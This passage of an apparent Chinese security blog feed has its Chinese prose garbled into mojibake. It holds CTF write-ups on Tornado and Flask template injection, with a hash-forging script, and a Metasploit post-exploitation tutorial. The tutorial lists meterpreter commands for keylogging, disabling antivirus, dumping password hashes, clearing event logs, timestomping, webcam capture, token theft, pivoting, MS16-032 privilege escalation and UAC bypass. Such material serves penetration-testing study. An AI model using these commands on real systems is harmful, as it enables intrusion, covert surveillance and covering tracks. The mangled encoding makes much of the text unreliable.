é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚<br>renderå‡½æ•°ä»‹ç»</p></blockquote></blockquote><blockquote><p>hints.txt</p><p><code>md5(cookie_secret+md5(filename))</code></p><p>åˆ†æurlï¼š<code>http://2ee77311-baf5-428b-9c3a-d86c6be03d0e.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=319862cec4f48911760eba1295bf83f5</code></p><p>filehash=md5(cookie_secret+md5(filename))<br>ç°åœ¨filename=/fllllllllllllagï¼Œåªéœ€è¦çŸ¥é“cookie_secretçš„æ—¢èƒ½è®¿é—®flagã€‚</p></blockquote><p>åœ¨è¯»å–æ–‡ä»¶å¤±è´¥é“¾æ¥ä¸­å‘ç°sstiæ¼æ´ï¼š</p><p><img src="/2021/04/05/wei/7.jpg" alt="7"></p><p>æµ‹è¯•å‘ç°ä¸€äº›å­—ç¬¦è¢«è¿‡æ»¤</p><pre><code class="hljs 1c"><span class="hljs-string">&quot; % &#x27; () * - /=[\]_|</span></code></pre><p>åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå¯ä»¥å‚è€ƒ<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax">Tornadoå®˜æ–¹æ–‡æ¡£</a></p><p>é€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°cookie_secretåœ¨Applicationå¯¹è±¡settingså±æ€§ä¸­ï¼Œè¿˜å‘ç°<code>self.application.settings</code>æœ‰ä¸€ä¸ªåˆ«å<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">requesthandler.settings</a></p><p><img src="/2021/04/05/wei/13.png" alt="13"></p><p><em>handleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ï¼ŒRequestHandler.settingsæŒ‡å‘self.application.settingsï¼Œå› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settingsã€‚</em></p><p>æ„é€ payload:</p><p><img src="/2021/04/05/wei/8.jpg" alt="8"></p><p>è®¡ç®—<code>filehash</code>:</p><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">s</span>):</span><span class="hljs-function"> <span class="hljs-variable">md5</span> = <span class="hljs-variable">hashlib.md5</span>() </span><span class="hljs-function"> <span class="hljs-variable">md5.update</span>(<span class="hljs-variable">s.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) </span><span class="hljs-function"> <span class="hljs-variable">return</span> <span class="hljs-variable">md5.hexdigest</span>()</span> <span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">filehash</span>():</span><span class="hljs-function"> <span class="hljs-variable">filename</span> = <span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span></span><span class="hljs-function"> <span class="hljs-variable">cookie_secret</span> = <span class="hljs-string">&#x27;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&#x27;</span></span><span class="hljs-function"> <span class="hljs-title">print</span>(<span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>)))</span> <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>: <span class="hljs-function"><span class="hljs-title">filehash</span>()</span></code></pre><p>æˆåŠŸï¼Œè¿™ä¸ªé¢˜ç›®å‘ç°æ¨¡æ¿æ³¨å…¥åçš„ä¸€ä¸ªå…³é”®è€ƒç‚¹åœ¨äº<code>handler.settings</code>ã€‚è¿™ä¸ªæ˜¯Tornadoæ¡†æ¶æœ¬èº«æä¾›ç»™ç¨‹åºå‘˜å¯å¿«é€Ÿè®¿é—®çš„é…ç½®æ–‡ä»¶å¯¹è±¡ä¹‹ä¸€ã€‚</p><h6 id="WesternCTF2018-shrine"><a class="header-anchor" href="#WesternCTF2018-shrine">ğŸ­</a>[WesternCTF2018]shrine</h6><p>åˆ†æä»£ç ï¼š</p><p><img src="/2021/04/05/wei/10.png" alt="10"></p><p>åœ¨æ²¡æœ‰é»‘åå•çš„æ—¶å€™ï¼Œå¯ä»¥ä¼ å…¥ configï¼Œæˆ–<code>&#123; &#123;self._*dict_*&#125; &#125;</code>è·å–ï¼Œä½†å½“è¿™äº›è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›å…¨å±€å˜é‡åˆ©ç”¨æ²™ç›’é€ƒé€¸çš„æ–¹æ³•ï¼Œæ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚åœ¨shrineè·¯å¾„ä¸‹ä½¿ç”¨<code>&#123; &#123;url_for.__globlas__&#125; &#125;</code>æŸ¥çœ‹</p><p><img src="/2021/04/05/wei/11.jpg" alt="11"></p><p><code>current_app</code>æ˜¯å…¨å±€å˜é‡ä»£ç†ï¼ŒæŸ¥çœ‹ä»–çš„<code>config</code>å³å¯</p><p><img src="/2021/04/05/wei/12.jpg" alt="12"></p><p>ä¹Ÿå¯ç”¨<strong>get_flashed_messages</strong>ï¼š</p><pre><code class="hljs isbl">è¿”å›ä¹‹å‰åœ¨<span class="hljs-variable">Flask</span>ä¸­é€šè¿‡ <span class="hljs-function"><span class="hljs-title">flash</span>() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ <span class="hljs-title">get_flashed_messages</span>(</span></code></pre><p>æ­¤ç±»é¢˜ç›®æ€è·¯:</p><blockquote><p>æŸ¥é˜…ç›¸å…³æ¡†æ¶çš„æ–‡æ¡£</p><p>ä½¿ç”¨<code>dir</code>å†…çœ<code>locals</code>å¯¹è±¡æ¥æŸ¥çœ‹æ‰€æœ‰èƒ½å¤Ÿä½¿ç”¨çš„æ¨¡æ¿ä¸Šä¸‹æ–‡</p><p>ä½¿ç”¨diræ·±å…¥å†…çœæ‰€æœ‰å¯¹è±¡</p><p>ç›´æ¥åˆ†ææ¡†æ¶æºç </p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>metasploitï¼ˆäºŒï¼‰â€”â€”åæ¸—é€æµ‹è¯•</title>
    <link href="/2021/03/05/wei2/"/>
    <url>/2021/03/05/wei2/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©æ¥å­¦ä¹ ä¸€ä¸‹åæ¸—é€æµ‹è¯•</p><h2 id="meterpreter"><a class="header-anchor" href="#meterpreter">ğŸ­</a>meterpreter</h2><p>Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œåœ¨æº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åè¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ï¼ˆä½œä¸ºæ”»å‡»è½½è·è·å¾—ç›®æ ‡ç³»ç»Ÿçš„Meterpreter shellçš„é“¾æ¥ï¼‰Meterpreter shellæœ‰å¾ˆå¤šåŠŸèƒ½ï¼šæ·»åŠ ç”¨æˆ·ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯â€¦â€¦ä¸”Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œç®€åŒ–ä»»åŠ¡åˆ›å»ºå¤šä¸ªä¼šè¯ã€‚å¯ä»¥æ¥åˆ©ç”¨è¿™äº›ä¼šè¯è¿›è¡Œæ¸—é€ã€‚<strong>meterpreteråœ¨æ¼æ´åˆ©ç”¨æˆåŠŸåä¼šå‘é€ç¬¬äºŒé˜¶æ®µçš„ä»£ç å’ŒmeterpreteræœåŠ¡å™¨dllï¼Œåœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹ç»å¸¸å‡ºç°æ²¡æœ‰å¯æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¼šè¯å»ºç«‹æ‰§è¡Œhelpä¹‹åå‘ç°ç¼ºå°‘å‘½ä»¤ã€‚ è¿ä¸Švpnåˆåœ¨å†…ç½‘ä¸­ä½¿ç”¨psexecå’Œbind_tcpçš„æ—¶å€™ç»å¸¸ä¼šå‡ºç°è¿™ç§æƒ…å†µ</strong></p><h4 id="Meterpreterä¼˜åŠ¿"><a class="header-anchor" href="#Meterpreterä¼˜åŠ¿">ğŸ­</a>Meterpreterä¼˜åŠ¿</h4><ul><li>çº¯å†…å­˜å·¥ä½œæ¨¡å¼ï¼Œä¸éœ€è¦å¯¹ç£ç›˜è¿›è¡Œä»»ä½•å†™å…¥æ“ä½œã€‚</li><li>ä½¿ç”¨åŠ å¯†é€šä¿¡åè®®ï¼Œè€Œä¸”å¯ä»¥åŒæ—¶ä¸å‡ ä¸ªä¿¡é“é€šä¿¡ã€‚</li><li>åœ¨è¢«æ”»å‡»è¿›ç¨‹å†…å·¥ä½œï¼Œä¸éœ€è¦åˆ›å»ºæ–°çš„è¿›ç¨‹ã€‚</li><li>æ˜“äºåœ¨å¤šè¿›ç¨‹ä¹‹é—´è¿ç§»ã€‚</li><li>å¹³å°é€šç”¨ï¼Œé€‚ç”¨äºWindowsã€Linuxã€BSDç³»ç»Ÿï¼Œæ”¯æŒIntel x86å’ŒIntelx64</li></ul><h4 id="å¸¸ç”¨å‘½ä»¤"><a class="header-anchor" href="#å¸¸ç”¨å‘½ä»¤">ğŸ­</a>å¸¸ç”¨å‘½ä»¤</h4><pre><code class="hljs properties"><span class="hljs-meta">?</span> <span class="hljs-string">å¸®åŠ©èœå•</span><span class="hljs-attr">channel</span> <span class="hljs-string">æ˜¾ç¤ºåŠ¨æ€é¢‘é“çš„ä¿¡æ¯</span><span class="hljs-attr">close</span> <span class="hljs-string">å…³é—­ä¸€ä¸ªé¢‘é“</span><span class="hljs-attr">exit</span> <span class="hljs-string">ç»ˆæ­¢meterpreterä¼šè¯</span><span class="hljs-attr">help</span> <span class="hljs-string">å¸®åŠ©èœå•</span><span class="hljs-attr">interact</span> <span class="hljs-string">é¢‘é“äº¤äº’</span><span class="hljs-attr">irb</span> <span class="hljs-string">IRBè„šæœ¬æ¨¡å¼</span><span class="hljs-attr">migrate</span>  <span class="hljs-string">pid  è½¬ç§»meterpreteråˆ°å…¶ä»–è¿›ç¨‹</span><span class="hljs-attr">quit</span> <span class="hljs-string">ç»ˆæ­¢meterpreter</span><span class="hljs-attr">read</span> <span class="hljs-string">ä»é¢‘é“è¯»æ•°æ®</span><span class="hljs-attr">run</span> <span class="hljs-string">æ‰§è¡Œä¸€ä¸ªmeterpreterè„šæœ¬</span><span class="hljs-attr">use</span> <span class="hljs-string">åŠ è½½ä¸€ä¸ªæˆ–å¤šä¸ªæ‰©å±•</span><span class="hljs-attr">write</span> <span class="hljs-string">å‘é¢‘é“å†™æ•°æ®</span><span class="hljs-attr">background</span>  <span class="hljs-string">æ”¾å›åå°</span><span class="hljs-attr">getlwd</span>  <span class="hljs-string">æŸ¥çœ‹æœ¬åœ°ç›®å½•</span><span class="hljs-attr">lcd</span>  <span class="hljs-string">åˆ‡æ¢æœ¬åœ°ç›®å½•</span><span class="hljs-attr">search</span> <span class="hljs-string">-d c:  -f *.doc  æœç´¢æ–‡ä»¶</span><span class="hljs-attr">run</span> <span class="hljs-string">post/windows/capture/keylog_recorder   é”®ç›˜è®°å½•</span><span class="hljs-attr">use</span> <span class="hljs-string">priv  åŠ è½½ç‰¹æƒæ¨¡å—</span><span class="hljs-attr">getsystem</span>  <span class="hljs-string">æå‡åˆ°SYSTEMæƒé™</span><span class="hljs-attr">steal_token</span> <span class="hljs-string">&lt;PID&gt;  çªƒå–ä»¤ç‰Œ</span><span class="hljs-attr">rev2self</span>  <span class="hljs-string">æ¢å¤åŸæ¥çš„ä»¤ç‰Œ </span><span class="hljs-attr">run</span> <span class="hljs-string">killav  å…³é—­æ€æ¯’è½¯ä»¶ </span><span class="hljs-attr">run</span> <span class="hljs-string">getgui-e  å¯ç”¨è¿œç¨‹æ¡Œé¢</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">add -l 1234 -p 3389 -r &lt;ç›®æ ‡IP&gt;  ç«¯å£è½¬å‘</span><span class="hljs-attr">run</span> <span class="hljs-string">get_local_subnets  è·å–å†…ç½‘ç½‘æ®µä¿¡æ¯</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -s &lt;å†…ç½‘ç½‘æ®µ&gt;  åˆ›å»ºè‡ªåŠ¨è·¯ç”±</span><span class="hljs-attr">run</span> <span class="hljs-string">autoroute -p  æŸ¥çœ‹è‡ªåŠ¨è·¯ç”±è¡¨</span><span class="hljs-attr">sessions</span> <span class="hljs-string">-l æŸ¥çœ‹ä¼šè¯</span><span class="hljs-attr">ç½‘ç»œå‘½ä»¤ï¼š</span><span class="hljs-attr">portfwd</span> <span class="hljs-string">å‘é€ä¸€ä¸ªæœ¬åœ°ç«¯å£åˆ°ä¸€ä¸ªè¿œç¨‹æœåŠ¡</span><span class="hljs-attr">route</span> <span class="hljs-string">æŸ¥çœ‹å’Œä¿®æ”¹è·¯ç”±è¡¨</span><span class="hljs-attr">ç³»ç»Ÿå‘½ä»¤ï¼š</span><span class="hljs-attr">clearev</span> <span class="hljs-string">æ¸…é™¤äº‹ä»¶æ—¥å¿—</span><span class="hljs-attr">execute</span> <span class="hljs-string">æ‰§è¡Œä¸€ä¸ªå‘½ä»¤</span><span class="hljs-attr">getpid</span> <span class="hljs-string">å–å¾—å½“å‰è¿›ç¨‹ID</span><span class="hljs-attr">getuid</span> <span class="hljs-string">å–å¾—æœåŠ¡å™¨è¿è¡Œç”¨æˆ·</span><span class="hljs-attr">kill</span> <span class="hljs-string">æ€æ­»ä¸€ä¸ªè¿›ç¨‹</span><span class="hljs-attr">ps</span> <span class="hljs-string">åˆ—å‡ºè¿›ç¨‹åˆ—è¡¨</span><span class="hljs-attr">reboot</span> <span class="hljs-string">é‡å¯è¿œç¨‹è®¡ç®—æœº</span><span class="hljs-attr">reg</span> <span class="hljs-string">ä¿®æ”¹è¿œç¨‹æ³¨å†Œè¡¨</span><span class="hljs-attr">rev2self</span> <span class="hljs-string">åœ¨è¿œç¨‹æœºå™¨è°ƒç”¨RevertToSelf()</span><span class="hljs-attr">shell</span> <span class="hljs-string">è¿”å›ä¸€ä¸ªcmdshell</span><span class="hljs-attr">shutdown</span> <span class="hljs-string">å…³é—­è¿œç¨‹ç³»ç»Ÿ</span><span class="hljs-attr">sysinfo</span> <span class="hljs-string">å–å¾—è¿œç¨‹ç³»ç»Ÿçš„ä¿¡æ¯</span><span class="hljs-attr">ç”¨æˆ·æ¥å£å‘½ä»¤ï¼š</span><span class="hljs-attr">enumdesktops</span> <span class="hljs-string">åˆ—å‡ºæ‰€æœ‰è®¿é—®æ¡Œé¢å’Œwindowså·¥ä½œç«™</span><span class="hljs-attr">idletime</span> <span class="hljs-string">è¿œç¨‹ç”¨æˆ·é—²ç½®æ—¶é—´</span><span class="hljs-attr">keyscan_dump</span> <span class="hljs-string">è½¬å­˜å‡»é”®ç¼“å­˜</span><span class="hljs-attr">keyscan_start</span> <span class="hljs-string">å¼€å§‹æ•æ‰å‡»é”®</span><span class="hljs-attr">keyscan_stop</span> <span class="hljs-string">åœæ­¢æ•æ‰å‡»é”®</span><span class="hljs-attr">setdesktop</span> <span class="hljs-string">è½¬ç§»å¦ä¸€ä¸ªå·¥ä½œç«™æ¡Œé¢</span><span class="hljs-attr">uictl</span> <span class="hljs-string">ç”¨æˆ·æ¥å£æ§åˆ¶</span><span class="hljs-attr">webcam_stream</span> <span class="hljs-string">å¼€å¯æ‘„åƒå¤´</span><span class="hljs-attr">screenshot</span>  <span class="hljs-string">æˆªå±</span><span class="hljs-attr">å¯†ç æ•°æ®åº“å‘½ä»¤ï¼š</span><span class="hljs-attr">hashdump</span> <span class="hljs-string">SAMè½¬å‚¨</span><span class="hljs-attr">æ—¶é—´æˆ³å‘½ä»¤ï¼š</span><span class="hljs-attr">timestomp</span> <span class="hljs-string">ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³</span></code></pre><h3 id="æµ‹è¯•"><a class="header-anchor" href="#æµ‹è¯•">ğŸ­</a>æµ‹è¯•</h3><p>åæ¸—é€æµ‹è¯•æ˜¯å»ºç«‹åœ¨æˆåŠŸå¯¹ç›®æ ‡æœºå™¨æ”»å‡»æ¸—é€åï¼Œæ•…è¿›å…¥meterpreteræ¨¡å—å‰éœ€åœ¨æ”»å‡»æœºå’Œç›®æ ‡æœºä¹‹é—´å»ºç«‹ä¸€ä¸ªshellï¼ˆä¸å†èµ˜è¿°ï¼ŒæŒ‰(ä¸€)é‡Œé‚£æ ·æ“ä½œï¼‰</p><p><img src="/2021/03/05/wei2/1.jpg" alt="1"></p><p>è¿™æ¬¡åˆ©ç”¨çš„æ˜¯PHP GCIå‚æ•°æ‰§è¡Œæ¼æ´ã€‚</p><h4 id="è¿›ç¨‹è¿ç§»"><a class="header-anchor" href="#è¿›ç¨‹è¿ç§»">ğŸ­</a>è¿›ç¨‹è¿ç§»</h4><p>åœ¨åˆšè·å¾—Meterpreter Shellæ—¶ï¼Œè¯¥Shellæå…¶è„†å¼±å’Œæ˜“å—æ”»å‡»çš„ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æµè§ˆå™¨æ¼æ´æ”»é™·ç›®æ ‡æœºå™¨ï¼Œä½†æ”»å‡»æ¸—é€åæµè§ˆå™¨æœ‰å¯èƒ½è¢«ç”¨æˆ·å…³é—­ã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯è¦ç§»åŠ¨è¿™ä¸ªShellï¼ŒæŠŠå®ƒå’Œç›®æ ‡æœºä¸­ä¸€ä¸ªç¨³å®šçš„è¿›ç¨‹ç»‘å®šåœ¨ä¸€èµ·ï¼Œè€Œä¸éœ€è¦å¯¹ç£ç›˜è¿›è¡Œä»»ä½•å†™å…¥æ“ä½œã€‚</p><h5 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h5><p>å…ˆ<code>ps</code>è·å–ç›®æ ‡æœºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹:</p><img src="/2021/03/05/wei2/ps.jpg" alt="ps" style="zoom: 67%;"><p>å†ç”¨<code>migrate [pid]</code>å‘½ä»¤å°†shellç§»åŠ¨åˆ°å¯¹åº”çš„pidçš„è¿›ç¨‹é‡Œï¼Œè¿›ç¨‹è¿ç§»å®ŒåŸæœ¬çš„shellè¿›ç¨‹ä¼šè‡ªåŠ¨å…³é—­ï¼Œè‹¥æ— è‡ªåŠ¨å…³é—­å¯ç”¨<code>kill [pid]</code>å‘½ä»¤å…³æ‰è¯¥è¿›ç¨‹</p><h5 id="æ³•äºŒ"><a class="header-anchor" href="#æ³•äºŒ">ğŸ­</a>æ³•äºŒ</h5><p>ä½¿ç”¨<code>run post/linux/manage/migrate</code>å‘½ä»¤ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å¯»æ‰¾åˆé€‚çš„è¿›ç¨‹è¿ç§»ã€‚</p><h4 id="æ”¶é›†ç³»ç»Ÿä¿¡æ¯"><a class="header-anchor" href="#æ”¶é›†ç³»ç»Ÿä¿¡æ¯">ğŸ­</a>æ”¶é›†ç³»ç»Ÿä¿¡æ¯</h4><blockquote><p><code>sysinfo</code>æŸ¥è¯¢ä¿¡æ¯</p><p><code>run post/linux/gather/checkvm</code>æŸ¥è¯¢ç›®æ ‡æœºæ˜¯å¦åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œ</p><p><code>idletime</code>æŸ¥çœ‹è™šæ‹Ÿæœºæœ€è¿‘è¿è¡Œæ—¶é—´</p><p><code>route</code>æŸ¥çœ‹ç›®æ ‡æœºå®Œæ•´çš„ç½‘ç»œè®¾ç½®</p><p><code>getuid</code>æŸ¥çœ‹å·²ç»æ¸—é€çš„ç”¨æˆ·å</p><p><code>run post/linux/manage/killav</code>å…³é—­æ€æ¯’è½¯ä»¶</p></blockquote><h4 id="å€ŸåŠ©è¢«æ”»å‡»çš„ä¸»æœºå¯¹å…¶å®ƒç½‘ç»œè¿›è¡Œæ”»å‡»"><a class="header-anchor" href="#å€ŸåŠ©è¢«æ”»å‡»çš„ä¸»æœºå¯¹å…¶å®ƒç½‘ç»œè¿›è¡Œæ”»å‡»">ğŸ­</a>å€ŸåŠ©è¢«æ”»å‡»çš„ä¸»æœºå¯¹å…¶å®ƒç½‘ç»œè¿›è¡Œæ”»å‡»</h4><blockquote><p>å…ˆ<code>run post/linux/manage/enable_rdp</code>å¯åŠ¨è¿œç¨‹æ¡Œé¢åè®®ï¼ˆ3389ç«¯å£ï¼‰</p><p>å†ç”¨<code>run post/linux/manage/autoroute</code>æŸ¥çœ‹ç›®æ ‡æœºæœ¬åœ°å­ç½‘</p><p>ç„¶åç”¨<code>route add xxx</code>å‘½ä»¤æ·»åŠ è·¯ç”±ï¼Œxxxçš„å€¼ç”±æœ¬åœ°å­ç½‘ä¸­ä¿¡æ¯å†³å®š(åœ¨æ­¤ä¹‹å‰å…ˆ<code>background</code>å°†ç»ˆç«¯éšè—åœ¨åå°)æ·»åŠ æˆåŠŸåå¯ç”¨<code>route print</code>æŸ¥çœ‹</p></blockquote><h4 id="æŠ“å–å„ç§ä¿¡æ¯"><a class="header-anchor" href="#æŠ“å–å„ç§ä¿¡æ¯">ğŸ­</a>æŠ“å–å„ç§ä¿¡æ¯</h4><blockquote><p>æ¥ç€ç”¨<code>run post/linux/gather/enum_logged_on_users</code>åˆ—ä¸¾ç™»å½•åœ¨ç›®æ ‡æœºä¸Šçš„ç”¨æˆ·</p><p>å†ç”¨<code>run post/linux/gather/enum_application</code>åˆ—ä¸¾å®‰è£…åœ¨ç›®æ ‡æœºä¸Šçš„åº”ç”¨</p><p>å½“ç”¨æˆ·å°†æŸåº”ç”¨è®¾ä¸ºè‡ªåŠ¨ç™»å½•æ—¶ç”¨<code>run windows/gather/credentials/windows_autologin</code>å¯æŠ“å–ç”¨æˆ·åå’Œå¯†ç </p><p>æˆªå±:ç”¨<code>screenshot</code>æˆ–<code>load espia(åŠ è½½æ’ä»¶)+screengrab</code></p><p>æ£€æŸ¥æ˜¯å¦æœ‰æ‘„åƒå¤´<code>webcam list</code></p><p>æ‰“å¼€æ‘„åƒå¤´æ‹ç…§ï¼š<code>webcam_snap</code></p><p>å¼€å¯ç›´æ’­æ¨¡å¼<code>webcan_stream</code></p></blockquote><h2 id="ææƒ"><a class="header-anchor" href="#ææƒ">ğŸ­</a>ææƒ</h2><p>é€šå¸¸åªè·å¾—ç³»ç»Ÿçš„Guestæˆ–Useræƒé™æ— æ³•è¿›è¡Œè·å–Hashã€å®‰è£…è½¯ä»¶ã€ä¿®æ”¹é˜²ç«å¢™è§„åˆ™å’Œä¿®æ”¹æ³¨å†Œè¡¨ç­‰å„ç§æ“ä½œï¼Œæ‰€ä»¥å¿…é¡»å°†è®¿é—®æƒé™ä»Gusetæå‡åˆ°User,å†åˆ°Administratorï¼Œæœ€ååˆ°Systemçº§åˆ«ã€‚<br>æ¸—é€çš„æœ€ç»ˆç›®çš„æ˜¯è·å–æœåŠ¡å™¨çš„æœ€é«˜æƒé™ã€‚</p><p>æå‡æƒé™çš„æ–¹å¼ï¼š<br>çºµå‘ææƒï¼šä½æƒé™è§’è‰²è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ã€‚<br>æ¨ªå‘ææƒï¼šè·å–åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚</p><h4 id="åˆ©ç”¨æ¼æ´ææƒ"><a class="header-anchor" href="#åˆ©ç”¨æ¼æ´ææƒ">ğŸ­</a>åˆ©ç”¨æ¼æ´ææƒ</h4><blockquote><p>å…ˆæŸ¥çœ‹å½“å‰æƒé™:<code>whoami/groups</code></p><p>ç›´æ¥<code>getsystem</code>ææƒ,ä½†ä¸€èˆ¬ä¼šå¤±è´¥</p><p>æŸ¥çœ‹è¡¥ä¸:<code>sysinfo</code>å³å¯(ä¹Ÿå¯ä»¥ç”¨wmicæŸ¥çœ‹)</p><p>æ¥ä¸‹æ¥æ‰¾ææƒçš„EXPï¼Œå°†ç³»ç»Ÿå·²ç»å®‰è£…çš„è¡¥ä¸ç¼–å·ä¸ææƒçš„EXPç¼–å·è¿›è¡Œå¯¹æ¯”ï¼Œä½¿ç”¨æ²¡æœ‰ç¼–å·çš„EXPè¿›è¡Œææƒ,å¦‚æœç”¨æœ€æ–°çš„MS16-032(æœ¬åœ°æº¢å‡ºæ¼æ´)æ¥å°è¯•ææƒï¼Œå¯¹åº”ç¼–å·æ˜¯KB3139914(å¯åœ¨å®‰å…¨ç„¦ç‚¹æˆ–è€…<code>Exploit-DB</code>æŸ¥è¯¢æ¼æ´çš„å…·ä½“ä¿¡æ¯)</p><p>ç„¶åå°†meterpreterè½¬åˆ°åå°,æœç´¢MS16-032æ¼æ´,æŒ‡å®šsessionè¿›è¡Œææƒå³å¯</p></blockquote><h4 id="ç»•è¿‡uac-ç”¨æˆ·è´¦æˆ·æ§åˆ¶-ææƒ"><a class="header-anchor" href="#ç»•è¿‡uac-ç”¨æˆ·è´¦æˆ·æ§åˆ¶-ææƒ">ğŸ­</a>ç»•è¿‡uac(ç”¨æˆ·è´¦æˆ·æ§åˆ¶)ææƒ</h4><p>å› ä¸ºwin7ä»¥ä¸Šç‰ˆæœ¬ç”µè„‘å«æœ‰UAC,æ•…getsystemææƒæ—¶ä¸€èˆ¬ä¼šå¤±è´¥</p><h5 id="ä½¿ç”¨askæ¨¡å—è¿›è¡Œå¼¹çª—ï¼Œç”¨æˆ·åœ¨å¼¹çª—ç‚¹å‡»â€œæ˜¯â€å³å¯ç»•è¿‡UAC"><a class="header-anchor" href="#ä½¿ç”¨askæ¨¡å—è¿›è¡Œå¼¹çª—ï¼Œç”¨æˆ·åœ¨å¼¹çª—ç‚¹å‡»â€œæ˜¯â€å³å¯ç»•è¿‡UAC">ğŸ­</a>ä½¿ç”¨askæ¨¡å—è¿›è¡Œå¼¹çª—ï¼Œç”¨æˆ·åœ¨å¼¹çª—ç‚¹å‡»â€œæ˜¯â€å³å¯ç»•è¿‡UAC</h5><ul><li><code>use exploit/windows/local/ask</code></li><li>set session 1</li></ul><h5 id="ä½¿ç”¨bypassuacæ¨¡å—ï¼Œåˆ©ç”¨å—ä¿¡ä»»çš„é€šè¿‡è¿›ç¨‹æ³¨å…¥çš„å‘å¸ƒè€…è¯ä¹¦ï¼Œäº§ç”Ÿä¸€ä¸ªå…³é—­UACæ ‡å¿—çš„shell"><a class="header-anchor" href="#ä½¿ç”¨bypassuacæ¨¡å—ï¼Œåˆ©ç”¨å—ä¿¡ä»»çš„é€šè¿‡è¿›ç¨‹æ³¨å…¥çš„å‘å¸ƒè€…è¯ä¹¦ï¼Œäº§ç”Ÿä¸€ä¸ªå…³é—­UACæ ‡å¿—çš„shell">ğŸ­</a>ä½¿ç”¨bypassuacæ¨¡å—ï¼Œåˆ©ç”¨å—ä¿¡ä»»çš„é€šè¿‡è¿›ç¨‹æ³¨å…¥çš„å‘å¸ƒè€…è¯ä¹¦ï¼Œäº§ç”Ÿä¸€ä¸ªå…³é—­UACæ ‡å¿—çš„shell</h5><ul><li><code>use exploit/windows/local/bypassuac</code>or<code>use exploit/windows/local/bypassuac</code></li><li>set session 1</li></ul><h2 id="ä»¤ç‰Œçªƒå–"><a class="header-anchor" href="#ä»¤ç‰Œçªƒå–">ğŸ­</a>ä»¤ç‰Œçªƒå–</h2><p>tokenä¹‹å‰ä»‹ç»è¿‡äº†,è¿™é‡Œåšä¸ªè¡¥å……</p><p>ä»¤ç‰Œç§ç±»:</p><ul><li><p>è®¿é—®ä»¤ç‰Œ(Access Token)è¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»é¢˜çš„ç³»ç»Ÿå¯¹è±¡</p></li><li><p>å¯†ä¿ä»¤ç‰Œ(Security token),åˆå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡</p></li><li><p>ä¼šè¯ä»¤ç‰Œ(Session 